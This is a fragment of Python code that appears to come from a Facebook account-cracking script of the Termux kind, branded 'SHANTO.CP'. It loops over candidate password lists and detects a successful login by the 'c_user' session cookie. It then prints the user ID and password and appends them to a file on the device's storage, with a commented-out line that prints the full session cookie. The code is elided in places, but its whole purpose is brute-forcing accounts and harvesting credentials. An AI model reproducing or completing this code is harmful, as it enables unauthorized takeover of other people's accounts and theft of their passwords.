    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	    print('\033[1;91m[SHANTO.CP]\033[1;93m[😪]\033[1;91m'+uid+' | '+ps+'\033[1;94m'+tahunng(uid))
    ...
    try:
        for ps in pwv:
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	    print('\033[1;91m[SHANTO.CP]\033[1;93m[😪]\033[1;91m'+uid+' | '+ps+'\033[1;91m '+tahunng(uid))
              #  print ('\033[1;32m[😔]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/SHANTO-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
